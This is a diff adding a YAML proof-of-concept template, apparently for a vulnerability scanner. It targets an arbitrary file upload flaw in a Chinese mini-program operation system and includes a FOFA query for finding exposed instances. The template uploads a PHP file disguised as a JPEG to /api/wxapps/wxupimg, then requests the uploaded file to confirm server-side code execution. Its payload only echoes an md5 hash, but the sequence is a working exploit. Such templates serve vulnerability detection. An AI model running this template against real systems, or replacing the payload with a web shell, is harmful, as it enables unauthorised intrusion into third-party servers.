@@ -1,0 +1,29 @@
+id: poc-yaml-mini-program-operation-system-wxupimg-anyfile-upload
+info:
+  name: 全行业小程序运营系统 wxupimg 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 全行业小程序运营系统
+  fofa: body="/com/css/head_foot.css"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  dt_1: datetime("2006")
+  dt_2: datetime("01")
+  dt_3: datetime("02")
+requests:
+- method: POST
+  path: /api/wxapps/wxupimg
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNGBhBIC624F4IANg
+  data: "------WebKitFormBoundaryNGBhBIC624F4IANg\nContent-Disposition: form-data;\
+    \ name=\"file\"; filename=\"{{.t1}}.php\" \nContent-Type: image/jpeg\n\n<?php\
+    \ echo md5({{.t1}});?>\n------WebKitFormBoundaryNGBhBIC624F4IANg--"
+  expression: status_code == 200 && contains(body,host)
+  output:
+  - regex_match(body,"(?P<file>[a-z0-9]{9,40}).php")
+- method: GET
+  path: /upimages/{{.dt_1}}{{.dt_2}}{{.dt_3}}/{{.file}}.php
+  expression: status_code == 200 && body == t2
+transport: http
